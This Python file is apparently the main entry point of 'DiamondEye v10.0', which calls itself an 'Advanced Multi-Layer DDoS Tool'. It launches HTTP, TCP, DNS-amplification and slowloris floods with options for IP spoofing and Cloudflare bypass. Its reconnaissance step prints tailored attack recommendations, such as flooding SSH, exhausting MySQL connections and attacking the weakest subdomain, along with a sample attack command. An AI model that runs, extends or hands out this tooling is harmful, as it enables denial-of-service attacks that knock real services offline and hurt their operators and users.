#!/usr/bin/env python3
# main.py
import asyncio
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    print("\033[96m⚡ uvloop activated — speed boost enabled\033[0m")
except ImportError:
    print("\033[93mℹ️  uvloop not available — using default asyncio\033[0m")

import time
import signal
import sys
import os
import socket
import json
from urllib.parse import urlparse

try:
    import matplotlib.pyplot as plt
    MATPLOTLIB_AVAILABLE = True
except ImportError:
    MATPLOTLIB_AVAILABLE = False

from args import parse_args
from core.attack_manager import AttackManager
from plugins.plugin_manager import PluginManager
from recon.scanner import ReconScanner, quick_recon
from colorama import Fore, Style, init

# Инициализация colorama
init(autoreset=True)


def load_useragents(filepath: str) -> list:
    """Загрузка User-Agent'ов из файла"""
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{Fore.RED}[DEBUG] Failed to load useragents: {e}{Style.RESET_ALL}")
        return []


def parse_methods(raw: str) -> list:
    """Парсинг HTTP методов"""
    ALL_METHODS = ['GET', 'POST', 'PUT', 'PATCH', 'OPTIONS', 'HEAD', 'DELETE']
    if not raw:
        return ['GET']
    if raw.upper() == 'ALL':
        return ALL_METHODS
    return [m.strip().upper() for m in raw.split(',') if m.strip().upper() in ALL_METHODS]


def validate_target(args):
    """Валидация цели атаки"""
    if args.attack_type == 'http' and not args.url and not args.recon:
        print(f"{Fore.RED}❌ URL is required for HTTP attack{Style.RESET_ALL}")
        return False
    
    if args.attack_type in ['tcp', 'dns', 'slowloris']:
        if not args.target_ip:
            print(f"{Fore.RED}❌ --target-ip is required for {args.attack_type} attack{Style.RESET_ALL}")
            return False
        
        # Проверяем валидность IP
        try:
            socket.inet_aton(args.target_ip)
        except socket.error:
            print(f"{Fore.RED}❌ Invalid IP address: {args.target_ip}{Style.RESET_ALL}")
            return False
    
    # Для HTTP атак проверяем URL
    if args.url and not args.recon:
        try:
            parsed = urlparse(args.url)
            if not parsed.scheme or not parsed.netloc:
                print(f"{Fore.RED}❌ Invalid URL: {args.url}{Style.RESET_ALL}")
                return False
        except Exception:
            print(f"{Fore.RED}❌ URL parse error{Style.RESET_ALL}")
            return False
    
    return True


async def handle_plugins(args):
    """Обработка плагинов"""
    plugin_manager = PluginManager()
    
    if args.list_plugins:
        print(f"{Fore.CYAN}📦 Available plugins:{Style.RESET_ALL}")
        
        await plugin_manager.discover_plugins()
        
        for plugin_info in plugin_manager.list_plugins():
            print(f"\n{Fore.GREEN}{plugin_info.name} v{plugin_info.version}{Style.RESET_ALL}")
            print(f"  Author: {plugin_info.author}")
            print(f"  Description: {plugin_info.description}")
            print(f"  Attack types: {', '.join(plugin_info.attack_types)}")
        
        return True
    
    elif args.plugin:
        print(f"{Fore.CYAN}🚀 Executing plugin: {args.plugin}{Style.RESET_ALL}")
        
        await plugin_manager.discover_plugins()
        
        plugin = plugin_manager.get_plugin(args.plugin)
        if not plugin:
            print(f"{Fore.RED}❌ Plugin '{args.plugin}' not found{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💡 Available plugins: {', '.join(plugin_manager.plugins.keys())}{Style.RESET_ALL}")
            return False
        
        # Загрузка конфигурации плагина
        plugin_config = {}
        if args.plugin_config:
            try:
                with open(args.plugin_config, 'r') as f:
                    plugin_config = json.load(f)
            except Exception as e:
                print(f"{Fore.RED}❌ Failed to load plugin config: {e}{Style.RESET_ALL}")
        
        # Базовая конфигурация
        base_config = {
            'target': args.url or args.target_ip,
            'workers': args.workers,
            'sockets': args.sockets,
            'debug': args.debug,
            'attack_type': args.attack_type,
            'duration': args.duration
        }
        
        plugin_config.update(base_config)
        
        # Инициализация и выполнение плагина
        try:
            await plugin.initialize(plugin_config)
            
            print(f"{Fore.GREEN}✅ Plugin initialized successfully{Style.RESET_ALL}")
            
            # Выполнение плагина
            start_time = time.time()
            result = await plugin.execute(plugin_config['target'])
            duration = time.time() - start_time
            
            print(f"\n{Fore.GREEN}✅ Plugin execution completed in {duration:.1f}s{Style.RESET_ALL}")
            print(f"{Fore.CYAN}📊 Results:{Style.RESET_ALL}")
            
            # Красиво выводим результаты
            for key, value in result.items():
                if isinstance(value, dict):
                    print(f"  {key}:")
                    for k, v in value.items():
                        print(f"    {k}: {v}")
                else:
                    print(f"  {key}: {value}")
            
            await plugin.cleanup()
            return True
            
        except Exception as e:
            print(f"{Fore.RED}❌ Plugin execution failed: {e}{Style.RESET_ALL}")
            if args.debug:
                import traceback
                traceback.print_exc()
            return False
    
    return False


async def handle_recon(args):
    """Обработка разведки"""
    target = args.url or args.target_ip
    if not target:
        print(f"{Fore.RED}❌ Target required for reconnaissance{Style.RESET_ALL}")
        return False
    
    print(f"{Fore.CYAN}🎯 Starting reconnaissance on {target}{Style.RESET_ALL}")
    
    try:
        scanner = ReconScanner(target)
        
        # Парсинг портов для сканирования
        ports_to_scan = []
        if args.recon_ports:
            for part in args.recon_ports.split(','):
                if '-' in part:
                    start, end = map(int, part.split('-'))
                    ports_to_scan.extend(range(start, end + 1))
                else:
                    ports_to_scan.append(int(part))
        
        # Настройка сканирования
        scanner_config = {
            'full_scan': args.recon_full,
            'ports': ports_to_scan if ports_to_scan else None
        }
        
        # Выполнение сканирования
        results = await scanner.full_scan()
        
        # Вывод отчета
        print("\n" + scanner.generate_report())
        
        # Сохранение отчета
        if args.recon_save:
            filename = args.recon_save
        else:
            safe_target = target.replace('://', '_').replace('/', '_').replace(':', '_')
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"recon_{safe_target}_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, default=str)
        
        print(f"\n{Fore.GREEN}✅ Reconnaissance report saved to {filename}{Style.RESET_ALL}")
        
        # Рекомендации по атаке на основе разведки
        await generate_attack_recommendations(results)
        
        return True
        
    except Exception as e:
        print(f"{Fore.RED}❌ Reconnaissance failed: {e}{Style.RESET_ALL}")
        if args.debug:
            import traceback
            traceback.print_exc()
        return False


async def generate_attack_recommendations(recon_data: dict):
    """Генерация рекомендаций по атаке на основе разведки"""
    print(f"\n{Fore.CYAN}🎯 Attack Recommendations:{Style.RESET_ALL}")
    
    recommendations = []
    
    # Анализ открытых портов
    if 'port_scan' in recon_data:
        open_ports = recon_data['port_scan'].get('open_ports', [])
        services = recon_data.get('services', {})
        
        for port in open_ports:
            service = services.get(port, '').lower()
            
            if port == 80 or port == 443 or 'http' in service:
                recommendations.append(f"  • Port {port} (HTTP): Use Layer7 attack with --attack-type http")
                if port == 443:
                    recommendations.append(f"    Use SSL/TLS: --no-ssl-check for testing")
            
            elif port == 53 or 'dns' in service:
                recommendations.append(f"  • Port {port} (DNS): DNS amplification attack with --attack-type dns --amplification")
            
            elif port == 22 or 'ssh' in service:
                recommendations.append(f"  • Port {port} (SSH): TCP flood with --attack-type tcp --target-port {port}")
            
            elif port == 3306 or 'mysql' in service:
                recommendations.append(f"  • Port {port} (MySQL): Connection exhaustion with --attack-type tcp --target-port {port}")
    
    # Анализ SSL/TLS
    if 'ssl_info' in recon_data:
        ssl_info = recon_data['ssl_info']
        if ssl_info.get('supported'):
            recommendations.append("  • SSL/TLS detected: Consider using --http2 for better performance")
    
    # Анализ DNS записей
    if 'dns_records' in recon_data:
        dns_records = recon_data['dns_records']
        
        # Проверка на Cloudflare
        if 'cloudflare' in str(dns_records.get('TXT', [])).lower():
            recommendations.append("  • Cloudflare detected: Use --bypass-technique cloudflare --cf-real-ip")
        
        # Проверка на наличие поддоменов
        if recon_data.get('subdomains'):
            recommendations.append(f"  • {len(recon_data['subdomains'])} subdomains found: Consider attacking weakest subdomain")
    
    # Анализ уязвимостей
    if 'vulnerabilities' in recon_data and recon_data['vulnerabilities']:
        vulns = recon_data['vulnerabilities']
        recommendations.append(f"  • {len(vulns)} vulnerabilities found: Target specific weaknesses")
        
        for vuln in vulns:
            if 'TRACE' in vuln.get('type', ''):
                recommendations.append(f"    - HTTP TRACE enabled: Use --method-fuzz")
            elif 'PHPINFO' in vuln.get('type', ''):
                recommendations.append(f"    - phpinfo exposed: Target /phpinfo.php with high load")
    
    # Вывод рекомендаций
    if recommendations:
        for rec in recommendations:
            print(rec)
    else:
        print(f"  {Fore.YELLOW}No specific recommendations. Use general attack methods.{Style.RESET_ALL}")
    
    print(f"\n{Fore.CYAN}💡 Sample attack command:{Style.RESET_ALL}")
    
    # Генерация примерной команды
    target = recon_data.get('parsed_url', {}).get('hostname', 'target.com')
    sample_cmd = f"python main.py http://{target} --workers 100 --flood"
    
    if len(open_ports) > 5:
        sample_cmd += " --adaptive"
    
    print(f"  {sample_cmd}")


def check_dependencies():
    """Проверка необходимых зависимостей"""
    missing_deps = []
    
    try:
        import aiohttp
    except ImportError:
        missing_deps.append("aiohttp")
    
    try:
        import httpx
    except ImportError:
        missing_deps.append("httpx")
    
    try:
        import psutil
    except ImportError:
        missing_deps.append("psutil")
    
    if missing_deps:
        print(f"{Fore.RED}❌ Missing dependencies: {', '.join(missing_deps)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 Install with: pip install {' '.join(missing_deps)}{Style.RESET_ALL}")
        return False
    
    return True


async def main():
    """Главная функция"""
    # Парсинг аргументов
    args = parse_args()
    
    # Если только --help или без аргументов, показываем помощь
    if len(sys.argv) == 1 or '--help' in sys.argv or '-h' in sys.argv:
        from args import get_parser
        get_parser().print_help()
        return
    
    # Проверка зависимостей
    if not check_dependencies():
        sys.exit(1)
    
    # Вывод баннера
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}🚀 DiamondEye v10.0 — Advanced Multi-Layer DDoS Tool{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}📦 Plugin System | 🎯 Reconnaissance | ⚡ Multi-Layer Attacks{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    
    # Обработка плагинов
    if args.list_plugins or args.plugin:
        await handle_plugins(args)
        return
    
    # Обработка разведки
    if args.recon:
        await handle_recon(args)
        return
    
    # Валидация цели
    if not validate_target(args):
        sys.exit(1)
    
    # Проверка конфликтов параметров
    if args.http2 and args.extreme:
        print(f"{Fore.YELLOW}⚠️  --http2 несовместим с --extreme — отключено{Style.RESET_ALL}")
        args.http2 = False
    
    if args.http3 and args.extreme:
        print(f"{Fore.YELLOW}⚠️  --http3 несовместим с --extreme — отключено{Style.RESET_ALL}")
        args.http3 = False
    
    if args.flood and args.slow > 0:
        print(f"{Fore.YELLOW}⚠️  --flood отключает --slow — режимы конфликтуют{Style.RESET_ALL}")
        args.slow = 0.0
    
    if args.header_flood and not args.junk:
        print(f"{Fore.YELLOW}⚠️  --header-flood требует --junk — включен автоматически{Style.RESET_ALL}")
        args.junk = True
    
    # Проверка прав для raw sockets
    if args.attack_type in ['tcp', 'dns'] and args.spoof_ip:
        try:
            # Пробуем создать raw socket для проверки прав
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            test_sock.close()
        except PermissionError:
            print(f"{Fore.YELLOW}⚠️  IP spoofing requires root/admin privileges{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}⚠️  Running without IP spoofing{Style.RESET_ALL}")
            args.spoof_ip = False
    
    # Загрузка User-Agent'ов
    useragents = load_useragents(args.useragents) if args.useragents else []
    
    # Добавляем специальные User-Agent'ы для localhost
    if args.url:
        parsed = urlparse(args.url)
        netloc = parsed.netloc.lower()
        if netloc.startswith(('127.', 'localhost', '0.0.0.0')):
            useragents.append("CTF-Scanner/10.0")
            useragents.append("Mozilla/5.0 (X11; Linux x86_64) DiamondEye-Mode")
    
    args.useragents = useragents
    
    # Парсинг методов
    args.methods = parse_methods(args.methods)
    
    # Ограничение воркеров для localhost
    if args.url:
        parsed = urlparse(args.url)
        netloc = parsed.netloc.lower()
        if netloc.startswith(('127.', 'localhost', '0.0.0.0')):
            max_workers = max(1, os.cpu_count() * 4)
            if args.workers > max_workers:
                print(f"{Fore.YELLOW}🔧 Localhost: workers limited to {max_workers}{Style.RESET_ALL}")
                args.workers = max_workers
    
    # Создание и запуск менеджера атак
    print(f"{Fore.CYAN}⚙️  Configuration:{Style.RESET_ALL}")
    print(f"  Attack Type: {args.attack_type.upper()}")
    print(f"  Workers: {args.workers} ({args.sockets} sockets each)")
    
    if args.url:
        print(f"  Target: {args.url}")
    elif args.target_ip:
        print(f"  Target: {args.target_ip}:{args.target_port}")
    
    if args.duration > 0:
        print(f"  Duration: {args.duration}s")
    
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    
    attack_manager = AttackManager(args)
    
    # Инициализация
    if not await attack_manager.initialize():
        print(f"{Fore.RED}❌ Failed to initialize attack manager{Style.RESET_ALL}")
        sys.exit(1)
    
    # Установка обработчика сигналов
    def signal_handler():
        print(f"\n{Fore.YELLOW}🛑 Received shutdown signal{Style.RESET_ALL}")
        asyncio.create_task(attack_manager.stop_attack())
    
    try:
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(sig, signal_handler)
    except NotImplementedError:
        # На Windows сигналы работают иначе
        pass
    
    # Запуск атаки
    start_time = time.time()
    
    try:
        await attack_manager.start_attack()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}🛑 Attack interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ Fatal error: {e}{Style.RESET_ALL}")
        if args.debug:
            import traceback
            traceback.print_exc()
    finally:
        # Остановка атаки если еще не остановлена
        await attack_manager.stop_attack()
        
        # Вывод итоговой статистики
        duration = time.time() - start_time
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✅ Attack completed{Style.RESET_ALL}")
        print(f"{Fore.CYAN}⏱️  Total duration: {duration:.1f}s{Style.RESET_ALL}")
        
        # Вывод отчета мониторинга ресурсов
        if attack_manager.resource_monitor:
            attack_manager.resource_monitor.print_final_report()
        
        # Сохранение отчетов
        if args.log:
            print(f"{Fore.CYAN}📝 Text report saved: {args.log}{Style.RESET_ALL}")
        
        if args.json:
            print(f"{Fore.CYAN}📦 JSON report saved: {args.json}{Style.RESET_ALL}")
        
        # Сохранение графика
        if args.plot and MATPLOTLIB_AVAILABLE:
            save_plot(attack_manager, args.plot)
        
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")


def save_plot(attack_manager, filepath):
    """Сохранение графика RPS"""
    if not attack_manager.stats.get('rps_history'):
        return
    
    try:
        import matplotlib.pyplot as plt
        
        times = [p['time'] for p in attack_manager.stats['rps_history']]
        rps = [p['rps'] for p in attack_manager.stats['rps_history']]
        
        plt.figure(figsize=(12, 6))
        
        # График RPS
        plt.subplot(2, 1, 1)
        plt.plot(times, rps, color='red', linewidth=1.5)
        plt.xlabel('Time (s)')
        plt.ylabel('Requests/Sec')
        plt.title('DiamondEye v10.0 - RPS over Time')
        plt.grid(True, alpha=0.3)
        
        # График общего количества
        if attack_manager.stats.get('bandwidth_history'):
            bw_times = [b['time'] for b in attack_manager.stats['bandwidth_history']]
            bw_values = [b['mbps'] for b in attack_manager.stats['bandwidth_history']]
            
            plt.subplot(2, 1, 2)
            plt.plot(bw_times, bw_values, color='blue', linewidth=1.5)
            plt.xlabel('Time (s)')
            plt.ylabel('Bandwidth (Mbps)')
            plt.title('Network Bandwidth Usage')
            plt.grid(True, alpha=0.3)
        
        plt.tight_layout()
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        plt.savefig(filepath, dpi=150)
        plt.close()
        
        print(f"{Fore.CYAN}📊 Plot saved: {filepath}{Style.RESET_ALL}")
        
    except Exception as e:
        print(f"{Fore.RED}❌ Plot error: {e}{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}🛑 DiamondEye stopped{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ Critical error: {e}{Style.RESET_ALL}")
        sys.exit(1)